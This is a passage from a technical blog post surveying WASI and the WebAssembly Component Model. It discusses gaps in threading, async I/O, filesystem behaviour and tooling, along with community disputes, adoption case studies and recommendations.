recompiled or adapted (18). Beyond networking, other OS features are still absent or limited in current WASI: there is no concept of process creation (fork/exec), no built-in inter-process communication (aside from pipes or sockets if provided), and no signal handling for things like graceful termination. These are important for complex applications or certain languages\u2019 runtimes. For example, a POSIX <code>fork()</code> would be hard to sandbox and was initially considered out-of-scope for WASI, but enough users needed it that the Wasmer team\u2019s WASIX fork added a <code>fork()</code> syscall and other POSIX functions (8) (8). This is controversial (adding a Unix-style fork in a modern sandbox breaks some expectations (8)), but it underscores that some existing software expects these capabilities.</p> <p>3. Filesystem &amp; Path Behavior Differences: WASI takes a capability-based approach to the filesystem \u2013 an embedder pre-opens specific host directories for the WASM module, and the module can only access files through those directory handles. There is no implicit \u201ccurrent working directory\u201d or global filesystem namespace as in a normal OS process, which was a design decision to improve security and portability. However, this caused friction for porting certain applications. Developers found that common operations like <code>chdir</code> (change directory) or <code>getcwd</code> (get current directory) were not available, and C/C++ code relying on these would fail or need emulation. One user advocating for CLI tool support noted that to seamlessly ship a cross-platform CLI as a single .wasm binary, WASI\u2019s behavior should match native as closely as possible. The lack of <code>chdir/getcwd</code> meant there were edge-case inconsistencies (e.g. the result of <code>getcwd</code> under emulation wouldn\u2019t notice if the host moved the directory, etc.) (19) (19). They proposed extending WASI with explicit <code>chdir</code> and <code>getcwd</code> calls to eliminate these differences (19). WASI\u2019s developers did eventually add a form of <code>chdir</code> in the filesystem proposal (as part of WASI Preview2\u2019s filesystem API, if the host opts to allow it), but this took time. Another subtle file-system issue is path handling across platforms \u2013 WASI uses a simplified POSIX-like model (forward slashes, UTF-8) and there have been long discussions on how to reconcile Windows vs Unix path semantics in a way that doesn\u2019t leak host specifics (20: Standardizing WASI: A system interface to run WebAssembly ...). The overarching theme is that WASI started minimal for security and simplicity, but real-world apps often needed more of the \u201cmessy\u201d OS details. Capabilities like working directory, relative paths, symlink resolution, file renaming, etc., had to be gradually introduced without compromising safety. Some gaps remain; for example, secure sandboxing of the filesystem is not automatic \u2013 the embedder must correctly preopen directories. Node\u2019s WASI module infamously did not restrict access properly by default, leading to the warning that it wasn\u2019t secure (13) (13). Going forward, the filesystem API in WASI will likely grow to cover more of POSIX (the WASI-filesystem proposal includes functions analogous to <code>openat()</code>, <code>renamed</code>, etc.), but striking the right balance between full POSIX fidelity and WebAssembly\u2019s portability goal is an ongoing challenge.</p> <p>4. Lack of Built-in Async I/O: As of WASI 0.2, there is still no native asynchronous I/O in WASI. Traditional OS interfaces often allow non-blocking operations or an event loop (epoll, etc.), but WASI Preview1 offered only a rudimentary <code>poll_oneoff</code> function for limited polling of file descriptors. This means that if a WASM module wanted to perform IO without blocking its single thread, it required host cooperation or library routines. Wasmtime internally uses async Rust (via tokio) to implement WASI calls, but from the WASM program\u2019s perspective those calls are synchronous and will block execution until completion (12). The Component Model is expected to resolve this by letting imports be defined as async and integrating with WASM\u2019s future async support (there\u2019s an upcoming WASM Promise Integration proposal for the JS API (6)). In fact, WASI 0.3 (Preview3) is slated to introduce native async support so that, for example, a WASI TCP socket read can await data without freezing the entire instance (2). Until that materializes, any I/O-heavy WASI program is either forced to be single-threaded synchronous or to use non-standard tricks. This is a barrier for high-performance network services (one of WASM\u2019s target domains, like microservices and serverless). Early adopters have used workaround patterns: some use multiple WASM instances to simulate concurrency, others rely on callbacks from the host to wake the WASM code with data (which is complicated without standardized async). This limitation also complicates embedding WASI modules in async hosts: for example, an async Rust app embedding Wasmtime had to enable an async calling context to prevent blocking on WASI calls. Wasmtime added an async configuration to pause and resume fibers for WASI calls (6: Introducing Wasmer 5.0 : r/rust), but not all runtimes have this. In short, lack of async was a known gap and is being actively fixed, but in the interim it has limited WASI\u2019s suitability for network servers and any case requiring overlapping I/O operations.</p> <p>5. Memory Sharing and Communication: By default, each WebAssembly module has its own linear memory. WASI and the Component Model did not initially provide a way to share memory between modules or with the host except via explicit copying. This means that if a host application wants to hand a large dataset (say a 100MB image) to a WASM module, it typically must copy it into the module\u2019s memory or use some manual mechanism (like memory mapping to a file descriptor). This copying can be a performance bottleneck in scenarios that require high throughput interactions between host and WASM. The new Component Model and recent proposals like Multiple Memories aim to alleviate some of this: modules can have multiple linear memories and possibly share one memory between components (2) (2). But multiple memories are brand new (standardized in 2024) and not widely utilized yet. So currently, one general performance constraint in WebAssembly is the overhead of crossing the boundary \u2013 calls from host to WASM or vice versa incur copying or marshalling costs, especially when complex data is involved. The Component Model\u2019s interface types will eventually allow passing, for example, a string or list without manual copying (the engine will translate it under the hood), but at present, many toolchains still lower everything to raw pointers and lengths, causing conversions. Indeed, a point of discussion in the WASI community was how strings are passed: today they are often passed as pointer/length (two i32 values) which is web-unfriendly and not the most efficient (21). The plan is to replace that with native string types once interface types are fully available (21) \u2013 this should improve both performance and developer ergonomics. Until then, CPU overhead of serializing/deserializing data is a minor adoption hurdle; in tight loop scenarios, WASM &lt;-&gt; host communication can become a bottleneck. (One early observation was that DOM calls from WebAssembly in the browser were slower than expected due to crossing the JS/WASM boundary frequently (1) (1: WebAssembly\u2019s Moment: Wasm Has Problems, But There\u2019s A Solution) \u2013 a similar principle applies outside the browser with host API calls.)</p> <p>6. Tooling and Debugging Gaps: Another often-cited limitation is the relative nascency of the developer tools around WASI. Debugging a crashing WASM module running under WASI can be challenging \u2013 until recently there was poor support for high-level debugging (setting breakpoints in the original source, etc.). Although projects like <code>wit-bindgen</code> and language-specific WASI SDKs exist, the maturity of toolchains is uneven. For example, languages like Python, Ruby, and C# only got basic WASM/WASI support in the last year or so (22), and their runtime support (e.g. garbage collectors working inside WASM, exceptions mapping, etc.) is still a work in progress. The community has noted that \u201clack of dev tool maturity is the real time waster\u201d in the current state of WebAssembly, even more than missing features (8) (8). This includes profiling tools (to find performance issues in JIT compilation or WASI calls), packaging and module distribution (the ecosystem is experimenting with WASM component registries, WAPM, etc., but not consolidated), and testing frameworks. The Component Model again is expected to help by standardizing how different languages express their interfaces (so that ideal \u201cWASM bindings\u201d frameworks can flourish, letting you call code across languages seamlessly). But as of now, each language has its own set of limitations when targeting WASI. For instance, the Go 1.21 WASI support passes most tests but still surprises users with the fundamental limitations of the platform (no threads, no true parallelism, blocking syscalls block all goroutines) (10) (10). These are documented, but a developer coming from native Go might not expect their WASM build to behave quite differently under load. Improvements in documentation and developer education are gradually filling this gap \u2013 e.g. the Go team explicitly enumerated such gotchas in their WASI port announcement (10) (10).</p> <p>In summary, WASI\u2019s technical gaps \u2013 missing multi-threading, historically no networking, partial OS feature coverage, lack of async, data passing overhead, and immature tooling \u2013 collectively hinder some \u201creal-world\u201d applications from being ported or built with WebAssembly today. Many of these are being actively addressed by ongoing proposals (threads, component model async, etc.), but until those are standardized and broadly implemented, developers either have to accept limitations or use custom solutions. Next, we will see how these limitations manifest in practice via community-reported issues and case studies, and how they affect adoption.</p>"},{"location":"blog/2025/02/16/wasi-and-the-webassembly-component-model-current-status/#community-challenges-and-unresolved-issues","title":"Community Challenges and Unresolved Issues","text":"<p>The WebAssembly and WASI community has been actively voicing pain points on GitHub, Reddit, and other forums. Examining these discussions helps illuminate what real users need and where current implementations fall short. Below we compile notable issues and feature requests from major runtime trackers and community dialogues:</p> <ul> <li> <p>Performance Bottlenecks in WASI Implementations: A stark example came from a user benchmarking file I/O in Wasmtime vs native. They found a simple program writing to a file was 10x slower in Wasmtime (23 seconds) than native (2 seconds) (12). Investigation revealed that Wasmtime\u2019s WASI implementation (at that time) used the async Tokio engine even for synchronous writes, leading to excessive syscall overhead and context switching (12) (12). In fact, an <code>strace</code> showed Wasmtime performing three times more system calls than the native counterpart for the same workload (12) (12). The developers acknowledged this as a bug to be optimized (12). This case underscores that performance parity with native is not guaranteed, especially for system call-heavy operations. Each runtime\u2019s internal design can greatly affect throughput: e.g. Wasmtime favored an async, capability-safe design at some cost to raw speed, whereas WAMR (which had a more direct approach) outperformed it in this test (12). Similar performance issues have been reported for specific patterns \u2013 another issue noted certain arithmetic operations being slower in one runtime versus another (23: Performance issue in some kinds of compound operations #6287), highlighting that compiler backends (Cranelift vs LLVM, etc.) still have optimization gaps. While WebAssembly is often touted as near-native speed, these reports show that suboptimal paths in runtimes or missing JIT optimizations can lead to unexpected slowness, which might deter users if not addressed. The good news is that such issues, once identified, usually lead to improvements in subsequent releases (e.g. by mid-2024 Wasmtime and Wasmer both made significant performance tuning to their I/O and code generation).</p> </li> <li> <p>WASI Preview Version Incompatibilities: The jump from WASI Preview1 to Preview2 (WASI 0.2) introduced breaking changes \u2013 not just new features but a new way to define the interface (WIT components instead of the old <code>wasi_unstable</code> interface). This means binaries compiled against WASI Preview1 are not compatible with Preview2 without adaptation (18). Developers have expressed frustration at having to rebuild or use shims. For example, an Hacker News discussion on \u201cWASI 0.2.0 and Why It Matters\u201d pointed out that \u201cit is not compatible with existing WASI functions\u2026 you need to change your binary with an adapter to get existing WASI binaries to run [on] preview2\u201d (18: WASI 0.2.0 and Why It Matters - Hacker News). The Bytecode Alliance anticipated this and provided a preview1-preview2 adapter tool (24) (24), but this extra complexity can impede adoption. A library author might hesitate to ship a WASM module if users then have to worry about which WASI version their runtime supports. To mitigate this, Wasmtime continues to support both preview1 and preview2 in parallel (and likely will for some time) (25: wasmtime_wasi - Rust - Docs.rs), and there are efforts in WASI to define a versioning strategy so that such breaking changes are minimized post-1.0 (26: Wasmtime and Cranelift in 2023 - Bytecode Alliance). Nonetheless, in 2023-2024 we\u2019re in a transitional period where WASI is evolving quickly, which ironically can slow adoption since some developers adopt a \u201cwait until it stabilizes\u201d stance. The AssemblyScript team\u2019s decision to remove WASI support is one example \u2013 while their reasons were more ideological (concern about web-incompatibility), it means any AssemblyScript module cannot use WASI until further notice, limiting its use outside the browser (27).</p> </li> <li> <p>Web vs Non-Web Tensions: A recurring theme is the divergence between WebAssembly\u2019s use on the Web (in browsers) and outside. Some web-focused developers worry that WASI is introducing concepts that don\u2019t translate to browsers, thus fragmenting the ecosystem. This concern was vocalized in both the AssemblyScript case and earlier discussions in the WebAssembly community. AssemblyScript maintainers objected to WASI APIs that can\u2019t be polyfilled in a browser (like sockets or certain filesystem calls), arguing it breaks the \u201ccompile once run anywhere\u201d ideal (27) (27). They felt the WASI subgroup was catering to OS use-cases \u201cincompatible with JS and existing web standards\u201d without clear communication (27). Similarly, a GitHub issue titled \u201cMay WASI turn out to harm Wasm on the Web?\u201d raised the point that a pure WASI application cannot run on the Web, and if popular libraries start depending on WASI, it could leave the web platform behind. Emscripten\u2019s lead contributors noted they tried adopting WASI for certain use cases but found \u201cmuch of it was too inefficient on the Web\u201d and thus couldn\u2019t use it for browser-targeted builds (21). They suggested perhaps a web-specific system interface (\u201cWASI for Web\u201d, jokingly dubbed WABI) might be needed if WASI continued focusing on non-web capabilities (21). The WASI developers responded that web and non-web builds can be separate but share tooling, and indeed, the idea now is to have different \u201cworlds\u201d or profiles \u2013 e.g., a component can be built for a WASI world or a DOM (browser) world with different imports. This fragmentation is a concern because it complicates portability: developers may need to compile different WASM binaries for browser vs server, or include fallbacks. It somewhat contradicts the hope that WebAssembly would let one binary run anywhere. The community seems to accept some split as unavoidable (browsers will never allow raw socket access for good reasons), but the key is minimizing divergence. This is why proposals like \u201cwasi-http\u201d are interesting \u2013 they could allow a WASM module to make HTTP requests in a portable way, and in a browser that could be implemented on top of <code>fetch()</code> whereas in WASI it uses sockets. Such efforts are ongoing to bridge the gap. The impatience in the community is notable: a 2023 survey found that satisfaction with the evolution of WASI was significantly lower than satisfaction with core WebAssembly features (28) (28). Many respondents expect WebAssembly to eventually fulfill the \u201cwrite once, run anywhere\u201d promise of Java, but clearly we\u2019re not fully there yet (28) (28: The State of WebAssembly 2023).</p> </li> <li> <p>Security and Sandboxing Concerns: While WebAssembly is often praised for strong sandboxing (memory safety and isolation), some discussions reveal edge-case security concerns. The Node.js WASI situation is one \u2013 Node chose not to implement a separate sandbox and instead relies on JS sandboxing, which means if a WASI module manages to escape or misuse the host APIs, it could do harm. The Node WASI module warns that secure sandboxing is not fully provided (14: WebAssembly System Interface (WASI) | Node.js v23.8.0 ...), and as one commenter put it, Node\u2019s WASI doesn\u2019t uphold the guarantees that would allow safely running untrusted code (13). They explicitly conclude \u201cdo not run untrusted code on it\u201d (13) (13). By contrast, Wasmtime and Wasmer\u2019s WASI implementations are designed with a strong sandbox \u2013 they don\u2019t automatically trust the module with anything not given. However, a subtle security challenge is ensuring the host integration is correct. For example, there was an issue about <code>path_open</code> in Node not using the proper system call (<code>openat</code>) under the hood, which could potentially allow directory traversal outside preopens (13). These kinds of bugs can crop up and must be carefully handled in each runtime. Another security aspect is denial-of-service and resource limiting \u2013 running untrusted code means you may want to limit its CPU time, memory, or file access. WebAssembly runtimes do enforce memory limits (each module\u2019s linear memory has a maximum), but limiting CPU or instructions executed is harder. There is no built-in \u201cgas meter\u201d in most WASM engines (except interpreters like WASM3 or WAMR which sometimes offer a step counter). Some runtimes (like WasmEdge) have added options for execution time limits or metering (29: The wasmedge CLI | WasmEdge Developer Guides), but it\u2019s not standardized. Thus, a host embedding WASI modules needs external mechanisms (like running in a separate thread and killing it on timeout, or using an async callback for timeout). Stack overflow and stack depth in WASM are also concerns \u2013 Wasmtime and others set a guard page, but configuring it (to prevent potential security bypass via stack overflow) might require tuning (30: Can either wasmer or wasmtime handle 1M concurrent wasm ...). No major breakout vulnerabilities have been reported in WASI runtimes to date, but security is an ever-present concern that adoptors (especially cloud providers) scrutinize. Fastly\u2019s CTO, in a 2024 piece, highlighted that robust sandboxing plus flexible interfaces is what finally allows \u201csecure, fast and compatible\u201d code outside the browser (3), implying that WASI 0.2\u2019s improvements were necessary to achieve that vision.</p> </li> <li> <p>Fragmentation via Custom Extensions: The slower pace of the official standard process led to multiple \u201cforks\u201d or extensions. We\u2019ve mentioned WASIX (Wasmer\u2019s POSIX superset) \u2013 it added threads, signals, fork, etc., on top of WASI Preview1. Another example is Threading proposals: before any standardized solution, some attempted custom implementations (like an early proposal for WASI threads with a particular library ()). While these solve immediate needs, they risk fragmenting the ecosystem if they diverge. Matt Butcher of Fermyon described \u201cThe Fragmentation Grenade\u201d as a top risk for WebAssembly \u2013 meaning different parties creating incompatible variants that split the community (22). Indeed, when WASIX was announced, some feared it would \u201ccompete with WASI Preview2\u2026 not good news for the Wasm ecosystem\u201d (8). Wasmer\u2019s team responded that they don\u2019t intend to fork forever, but wanted to \u201cgive [standards] a nudge\u201d by demonstrating needed features (8) (8). They insisted \u201cWASIX does not compete with WASI, it enhances it by adding features from POSIX that most users need\u201d, and expressed hope that those features could migrate into WASI in time (8) (8). This dynamic between pushing ahead vs. staying unified is a delicate balance. Other fragmentation examples include bespoke WASI implementations for niche domains (like wasi-nn for machine learning inference, which provides an API to run neural nets). If a WASM module uses WASI-NN, only runtimes supporting that proposal can run it. Thus, until such proposals are standardized or widely adopted, using them reduces your portability. The recommendation from leaders in the field is to collaborate in standards bodies (W3C, Bytecode Alliance, and CNCF WebAssembly WG) to incorporate popular extensions, and simultaneously for vendors to avoid gratuitous deviations. The Bytecode Alliance\u2019s module compatibility matrix (24: Land WASI Preview 2 support into Wasmtime \u00b7 Issue #6370 \u00b7 bytecodealliance/wasmtime \u00b7 GitHub) and CNCF surveys help track this, but it remains a challenge for developers: one must carefully choose which WASI features to rely on, or conditionally support multiple fallbacks.</p> </li> </ul> <p>Case Studies Impacting Adoption: To illustrate how these challenges block use cases, consider a few scenarios:</p> <ul> <li> <p>Serverless Function Provider: Imagine a cloud provider wants to let users deploy functions in WebAssembly (using WASI for filesystem and network). They need strong isolation (sandbox), multi-tenancy performance, and support for common runtimes (perhaps users code in Python, Go, etc.). In early 2023, if they tried this with WASI Preview1, they\u2019d hit a wall with networking (no outbound sockets). They would either have to tell users \u201cno network calls\u201d (unacceptable for most apps), or maintain a custom patch (like an internal fork of Wasmtime with experimental socket syscalls). They\u2019d also struggle with concurrency \u2013 all WASM instances are single-threaded, so handling many requests might require running many WASM instances, increasing overhead. Cold start times become an issue then (though WASM is generally faster to start than containers). Indeed, Fastly\u2019s and Cloudflare\u2019s explorations into WASM found that some workloads didn\u2019t fit until threading and networking came into play. Now with Preview2\u2019s wasi-sockets and upcoming threads, these use cases open up. But the case study here is: lack of networking and threads was a showstopper for adopting WASM in a general-purpose serverless platform. Fastly\u2019s team explicitly celebrated WASI 0.2 as it \u201crepresents an official stabilization of the Component Model and collection of WASI APIs\u201d needed for a robust foundation (3). In other words, only now (2024) do they consider the platform ready to build those \u201cLEGO brick\u201d style apps that they and others envisioned.</p> </li> <li> <p>CLI Tools Distribution: A developer wants to distribute a command-line tool to many platforms. WebAssembly sounds appealing: compile once to .wasm, and users can run it on Windows, Linux, Mac via a WASI runtime. They port their C++ tool to target WASI. Immediately, they encounter that <code>chdir</code> and relative path handling aren\u2019t like a normal OS. Their tool, which expects to start in the user\u2019s current directory and manipulate files, behaves unexpectedly under WASI because everything is relative to preopened dirs and <code>getcwd</code> is not available. In an issue, they note differences between native and WASI builds and request better support for current directory handling (19) (19). Until that is resolved, their users might get confusing behavior (e.g., the tool might treat <code>/</code> differently, or not follow symlinks as expected). This friction might lead them to delay offering a WASM version. This scenario shows how seemingly small gaps (like missing <code>getcwd</code>) can reduce confidence in using WASM for software distribution. It\u2019s being improved, as WASI\u2019s goals explicitly include supporting great CLI tools (19: Supporting an \"initial current directory\" \u00b7 Issue #24 \u00b7 WebAssembly/wasi-filesystem \u00b7 GitHub), but it took time to catch up to what native devs expect.</p> </li> <li> <p>Language Ecosystem Buy-In: The AssemblyScript saga is a case where a community backed away from WASI due to philosophical differences. AssemblyScript (AS) is a TypeScript-like language compiling to WASM. Many saw it as a way to leverage web developers\u2019 skills for both browser and server WASM. However, the AssemblyScript team felt that WASI\u2019s direction (adding non-web APIs, using interface types that don\u2019t align 100% with JS types, etc.) wasn\u2019t in AS\u2019s interest. They published an objections document and removed WASI from their standard library. The consequence: AssemblyScript modules can no longer easily access files or environment when run under Wasmtime/Wasmer; they are essentially sandboxed to browser-like capabilities. One commenter noted this will make it \u201cimpossible to run [AssemblyScript] outside the web\u201d, isolating it from the growing world of WASI-enabled use cases (27) (27). They pointed out that AS will miss out on any WASI APIs that could be implemented on the web too, and that the AS authors seemed to misunderstand WASI\u2019s purpose (27). Regardless of sides, this incident highlights an adoption blocker: if frameworks or languages don\u2019t cooperate with WASI, users face a fragmented ecosystem. Someone picking AssemblyScript might not realize they can\u2019t use it for a WASI plugin later, undermining the \u201cuniversal\u201d story of WebAssembly. The recommendation many had was that AssemblyScript could maintain a modular approach \u2013 e.g., let users opt-in to WASI if they want \u2013 rather than outright removal. This is a community coordination problem as much as technical. We might see it resolved if web-compatible subsets of WASI are defined, or if AssemblyScript changes course. But for now, it\u2019s a real-world example of how disagreements on WASI\u2019s design affected adoption in a language community.</p> </li> <li> <p>Web Application Needing System Access: Consider a scenario with a web app that also has a desktop version, and the developers want to reuse code via WASM. They have some core logic (say a data processing library in C++) that they compile to WASM. In the browser, it runs with no WASI (just pure computation). For the desktop, they\u2019d like it to read files or use network. They could compile a WASI-enabled version for the desktop and run it with Wasmtime. But they discover that the WASM binary needs to be different (one was <code>wasm32-unknown-unknown</code>, one is <code>wasm32-wasi</code>). Now they have to ship two flavors or figure out dynamic adaptation. If they try to use the WASI binary in the browser via a polyfill, they find it\u2019s \u201ctoo inefficient\u201d or that certain calls just can\u2019t work. This hypothetical echoes actual developer remarks on inefficiency when trying to use one module in both web and WASI contexts (21). Until the Component Model possibly allows a single component to contain both web and WASI bindings, developers must navigate this carefully. It\u2019s a barrier for those aiming for true cross-platform modules.</p> </li> </ul> <p>Overall, these community issues paint a picture of an ecosystem maturing but still experiencing growing pains. The next section offers recommendations and outlook based on these findings, focusing on what is needed to push WebAssembly and WASI into wider, smoother adoption.</p>"},{"location":"blog/2025/02/16/wasi-and-the-webassembly-component-model-current-status/#recommendations-and-future-outlook","title":"Recommendations and Future Outlook","text":"<p>WebAssembly\u2019s potential \u2013 fast, safe, portable code \u2013 has driven tremendous enthusiasm, but to realize it outside the browser, the WASI and Component Model infrastructure must fully address the highlighted challenges. Here we provide recommendations and note ongoing efforts, aligned with the problems discussed:</p> <p>1. Accelerate Standards Completion, but Maintain Cohesion: Many of the current blockers (threads, async, component model in browsers) are known and are simply awaiting standardization and implementation. It\u2019s crucial that the WebAssembly Community Group and Bytecode Alliance continue to push these to completion. The slower pace of standards was identified as a risk (22) (22) \u2013 so finding ways to accelerate without fragmenting is key. One idea is to define clear version milestones (as is happening with WASI 0.2, 0.3, etc.) and encourage runtimes to implement in parallel. The success of WASI Preview2 \u2013 reaching a \u201cminimum viable\u201d set of syscalls \u2013 is a big step; next, getting to WASI 1.0 with backward compatibility guarantees will reassure developers that the platform is stable. In tandem, the Component Model should reach Phase 4/5 (standard/implementation phase) as soon as practical, so that tooling ecosystems treat it as a given. Part of this involves browser vendors; while WASI is mainly for out-of-browser, the Component Model could also benefit web (for multi-module applications). Having at least two major engines (Wasmtime and Wasmer, for example) fully support the Component Model will signal its readiness. As of 2024, Wasmtime and experimental tools like <code>componentize-py</code>, <code>.NET componentize</code> are emerging, but broader language support is needed so that, say, a Python library can be automatically turned into a component and used from Rust or JS easily. Encouraging cross-collaboration (e.g., between Bytecode Alliance and projects like AssemblyScript) will help avoid duplicated efforts. The Bytecode Alliance\u2019s open development and forums like WASM Implementers\u2019 calls should continue to invite feedback from all stakeholders (web and non-web) to ensure the final standards meet general needs.</p> <p>2. Prioritize Missing Features with High Impact: Based on the issues, the highest-impact missing features to address are: multi-threading, asynchronous I/O, and sockets (which is done in Preview2). The good news is all are in progress: Threads are in late stages for the core WASM spec (Phase 4) and some engines (browser and server) have experimental support, so we should expect WASI to adopt threads once that\u2019s stable. It might also involve adding an API for thread creation in WASI (perhaps via a new <code>wasi-threads</code> module) \u2013 designing that in a capability-safe way (without exposing full POSIX <code>pthread</code> weirdness) will be important. Asynchronous I/O in WASI 0.3 should land in 2025, and the recommendation is to ensure it covers not only network sockets but also files and other operations, so that languages like Go or Node that rely on async patterns can integrate cleanly. It would also be wise to create guidance for embedding WASI in async hosts \u2013 e.g., official patterns for using an event loop with WASI modules (some of this exists in Wasmtime docs). For networking, beyond basic sockets, consider higher-level protocols: wasi-http (in Preview2) is an example of a high-level API for HTTP requests. That should be fleshed out and possibly expanded to things like gRPC or other common protocols via libraries on top of sockets. Additionally, missing OS features like signals or process management need clarity: if the goal is to support \u201ceverything a Unix process can do\u201d, then perhaps a WASI proposal for subprocess spawning (with careful sandboxing, maybe like a controlled <code>posix_spawn</code> that can only launch another WASM module) could be introduced. If that\u2019s out of scope, it should be clearly documented so developers know to avoid those patterns or emulate in other ways.</p> <p>3. Improve Performance through Engine Optimizations and Tooling: The performance issues identified can be mitigated by both low-level optimization and giving developers better insight. Runtimes should continue to optimize syscalls \u2013 for instance, Wasmtime might switch to a more direct IO implementation for synchronous writes to close the 10x gap seen in the issue (12). Efforts like Lucet (Fastly\u2019s former AOT compiler) and ongoing Cranelift improvements can help WASM code execution speed approach native. There\u2019s also the area of CPU feature exploitation: proposals like SIMD and new instructions (memory64, tail calls, etc.) that are now standardized should be leveraged in WASI environments for speedups. For example, heavy crypto or math in WASI can benefit from 128-bit SIMD now that it\u2019s standard and available in Wasmtime, Wasmer, etc. Another angle is ahead-of-time compilation: shipping precompiled native code for a WASM module (when target architecture is known) can remove JIT overhead at runtime. Wasmer and Wasmtime both allow pre-compilation; developers should be encouraged to use this for production deployments. On the tooling side, providing profile-guided optimization or at least profiling tools for WASM would allow pinpointing hotspots (like the tokio issue) more easily. The community might benefit from a standardized benchmark suite (similar to SPEC) to measure WASI runtime performance across various tasks (IO, compute, startup) \u2013 this can drive competition and improvement. Indeed, independent benchmarks in early 2023 by Frank Denis (11) (11: Performance of WebAssembly runtimes in 2023 |  Frank DENIS random thoughts.), etc., have been useful to identify slow spots; continuing such efforts and including more WASI-oriented tests (like networking throughput or multi-instance scaling) will be helpful.</p> <p>4. Strengthen Security and Sandbox Tooling: To increase confidence in adopting WebAssembly for untrusted code, the runtimes should aim for provable security properties. This includes completing work on things like module sandboxing API (so a host can easily restrict a module\u2019s resources) and auditing filesystem access controls (to avoid issues like Node\u2019s). One practical recommendation is to implement mandatory access control logging: a WASI runtime could provide debug logs of every attempt to open a file or socket, which could help developers ensure their module only touches what\u2019s intended. Also, integrating with container security contexts \u2013 e.g., running Wasmtime inside a Docker container with seccomp \u2013 can provide defense in depth. Perhaps provide templates or guides for that. Another idea is a WASM \u201cjail\u201d manager that can run WASI modules with configured limits (time, memory, etc.) and kill or pause them as needed \u2013 an analog to container runtimes but for WASM. Some projects (like wasmCloud, Fermyon\u2019s Spin) are already building such orchestration; contributing back any generic tooling to Bytecode Alliance or CNCF could make it broadly available. Given Node\u2019s WASI is not secure for untrusted code, a recommendation to Node would be either deprecate that in favor of an embedded Wasmtime, or revamp it to meet the WASI spec\u2019s sandbox requirements (though that might mean rewriting parts in Rust or using a different approach). Until then, documentation should clearly state the limitations (which Node does, albeit in small print). For other runtimes, transparency about any sandbox escapes or CVEs and prompt fixes will be important to maintain trust.</p> <p>5. Bridge the Web and WASI ecosystems: To avoid the Web vs. WASI split, efforts should be made to define a common subset and polyfills. For instance, the community could define a profile of WASI that is web-compatible (no forbidden syscalls) \u2013 AssemblyScript or other browser-focused toolchains could target that. At the same time, browsers could implement certain WASI proposals that make sense for them: one obvious candidate is the wasi-clock and wasi-random interfaces (browsers can supply time and randomness easily, which aligns with existing Web APIs). If those become standard, then a WASM module that just needs time or random doesn\u2019t have to special-case between web and WASI \u2013 it can always use WASI calls, and the browser environment would just provide them (perhaps via JavaScript glue). Some discussion on a \u201cWASI for Web\u201d (maybe tongue-in-cheek called WABI) suggested making new web-focused APIs under the WASI umbrella (21) (21). That might be a good compromise: define, for example, a WASI-web API for things like DOM manipulation or <code>fetch</code> networking, which would only be available in a browser embedder but follows the same component model approach. Over time, the difference between a \u201cweb assembly module\u201d and a \u201cWASI module\u201d could then just be which world it imports (wasi-web vs wasi-cli, etc.), and using the Component Model, one could even produce a single .wasm package containing multiple variants. In the short term, better tooling to target multiple outputs (web and WASI) from one codebase would help. Emscripten already can produce a WASI output or a JS output; it could be made more seamless. Documentation should guide developers on how to maintain compatibility (e.g., use feature detection in the module to fall back to JS APIs if WASI imports aren\u2019t present \u2013 some advanced users do craft modules that check imports at runtime). The goal is to minimize duplicate effort and ensure web use-cases are not sidelined even as server-side WASM blooms.</p> <p>6. Enhance Developer Experience (DX): Lowering the barrier to entry for using WASI will drive adoption. This includes providing high-level language SDKs for WASI: for example, the Go team did a great job making <code>GOOS=wasip1</code> mostly \u201cjust work\u201d and documenting limitations (10). Other languages should follow suit (many are: Rust\u2019s standard library has a WASI target, Python\u2019s WASM story is improving with Pyodide and WASI support). Ensuring that languages can easily generate WASM components (not just raw WASM modules) will be important so that in the future one can, say, write a library in Python and use it as a component in a Rust program without hassle. Projects like <code>componentize-py</code>, <code>componentize-dotnet</code> are steps in this direction (2). More broadly, the community should develop testing frameworks and best practices for WASI modules. For instance, how do you unit test a module that expects certain preopened dirs or env vars? Possibly by having a lightweight host harness that simulates those. Efforts like wasmCloud\u2019s \u201cwash\u201d CLI for local development aim to \u201cbring the hot reload experience to WebAssembly\u201d and streamline dependency resolution for components (17) (17). These are great for DX and should be expanded upon. The easier it is for developers to iteratively build and debug WASI apps (with tools akin to what they have for native or web), the more likely they are to adopt the tech. Another DX aspect is package management: the community might converge on publishing WASI binaries or components to registries (e.g., OCI registries via container images, or specialized ones like WAPM). Clear guidance on how to publish and consume WASM modules (similar to npm or PyPI but for WASM) would encourage a \u201cplugin economy\u201d using WASI. This ties into integration \u2013 e.g., if a database like PostgreSQL could allow stored procedures in WASM, one would need a way to distribute those modules conveniently.</p> <p>7. Continue Community Engagement and Knowledge Sharing: Finally, sharing success stories and remaining hurdles openly will help the ecosystem mature. Case studies where WebAssembly was integrated (or where it failed to) should be documented. For example, if a company tried to replace a Docker microservice with a WASI module and encountered specific limitations, writing that up helps others anticipate issues and also provides feedback to runtime maintainers. The Bytecode Alliance and CNCF WebAssembly group are good forums for that. The community should also maintain an updated \u201cWASI support matrix\u201d covering each major runtime (Wasmtime, Wasmer, WasmEdge, Node, browsers via polyfill, etc.) and listing which features are supported to what extent. This transparency will let developers choose the right tool for their use case (for instance, knowing that \u201cfor multi-threading, only Wasmtime with an experimental feature flag supports it as of now\u201d or \u201cfor running on iOS, maybe only Wasm3 interpreter works due to JIT restrictions\u201d etc.). Right now information is scattered; consolidating it can reduce confusion.</p> <p>In conclusion, WebAssembly with WASI and the Component Model is on the cusp of becoming a universal runtime for plugin systems, cloud computing, and beyond. The challenges identified \u2013 from technical gaps to ecosystem fragmentation \u2013 are those of a young but rapidly evolving technology. The current status is that many pieces (WASI 0.2, component model draft, runtime implementations) are in place, addressing earlier criticisms, but a few critical pieces (threads, stable async, broad adoption of component model) are just emerging. By methodically closing the remaining gaps and fostering collaboration over fragmentation, the community can unlock WebAssembly\u2019s full potential. As these improvements land, we anticipate broader real-world adoption: more projects choosing WASM for safe plugin execution, more cloud platforms offering WASM as a deployment target, and even desktop or IoT applications using WASI to go truly cross-platform. The path is clear; now it\u2019s about execution and refinement. With continued efforts, the vision of \u201csecure, fast, portable code running anywhere\u201d \u2013 hinted by many as WebAssembly\u2019s promise \u2013 will be fully realized (3), ushering in a new era of software modularity and distribution.</p> <p>Sources:</p> <ul> <li>Bytecode Alliance &amp; WASI Proposals (WASI Preview2 content and roadmap) (2) (2: The State of WebAssembly \u2013 2024 and 2025)  </li> <li>Go WASI Support Announcement (limitations of WASI like no threads, no full sockets) (10) (10: WASI support in Go - The Go Programming Language)  </li> <li>Reddit: Wasmer\u2019s WASIX discussion (slow WASI progress, added fork and POSIX features) (8) (8)  